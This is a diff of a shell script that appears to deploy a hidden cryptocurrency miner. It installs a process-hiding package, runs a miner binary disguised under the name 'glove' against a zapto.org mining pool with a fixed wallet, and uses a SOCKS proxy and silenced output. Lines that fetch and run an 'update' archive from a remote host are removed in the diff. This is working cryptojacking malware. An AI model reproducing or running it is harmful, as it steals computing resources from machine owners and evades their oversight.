@@ -44,35 +44,6 @@ curl -x socks5h://127.0.0.1:1082 ifconfig.me
 
 sleep 2
 
-wget http://greenleaf.teatspray.fun/update.tar.gz
-
-sleep 2
-
-tar -xf update.tar.gz > /dev/null
-
-sleep 2
-
-cat > update/local/update-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:1082
-END
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-
-sleep 3
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-./update/update curl api.ipify.org
-
-
 npm i -g node-process-hider 1>/dev/null 2>&1
 
 sleep 2
@@ -95,4 +66,4 @@ apt -y install build-essential automake libcurl4-openssl-dev libjansson-dev libg
 
 sleep 2
 
-./update/update ./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores 1>/dev/null 2>&1
+./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores --proxy=socks5://127.0.0.1:1082 1>/dev/null 2>&1
